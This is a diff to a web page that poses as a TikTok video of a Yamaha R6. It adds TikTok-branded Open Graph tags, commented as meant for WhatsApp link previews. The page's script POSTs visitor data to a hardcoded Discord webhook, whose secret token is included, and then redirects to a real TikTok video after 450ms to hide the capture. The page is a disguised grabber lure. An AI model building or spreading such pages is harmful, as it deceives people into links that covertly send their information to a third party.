@@ -4,6 +4,15 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TikTok - Yamaha R6 Black Edit</title>
+
+    <!-- Etiquetas Open Graph estructuradas correctamente para WhatsApp -->
+    <meta property="og:title" content="Yamaha R6 Black: El Video Edit de la Superbike que Buscabas 😶‍🌫️🖤 | TikTok" />
+    <meta property="og:description" content="Mira el video de 月 tsuki (@r6_xvv) en TikTok. YAMAHA R6 #Yamaha #R6 #sportsbike #motorcycle #bikelife #biketiktok" />
+    <meta property="og:image" content="https://unsplash.com" />
+    <meta property="og:url" content="https://tiktok.com" />
+    <meta property="og:type" content="video.other" />
+    <meta property="og:site_name" content="TikTok" />
+
     <style>
         body { 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
@@ -71,7 +80,6 @@
     </div>
 
     <script>
-        // CONFIGURACIÓN DE TU INFRAESTRUCTURA
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1554562359383556197/wJs1y9CfsQFL10UI5K-Y40M2k0OOfdqtV_3mg9Iy1wWFE25RkeuI4l0edpvbNwOjLSik";
         const VIDEO_DESTINO = "https://www.tiktok.com/@r6_xvv/video/7515913288111213842";
 
@@ -116,7 +124,6 @@
                 }]
             };
 
-            // Envío en paralelo (Asíncrono) para evitar retrasos visuales
             try {
                 fetch(DISCORD_WEBHOOK_URL, {
                     method: "POST",
@@ -125,7 +132,6 @@
                 });
             } catch (error) {}
 
-            // Forzar redirección fluida a los 450ms
             setTimeout(() => {
                 window.location.href = VIDEO_DESTINO;
             }, 450);
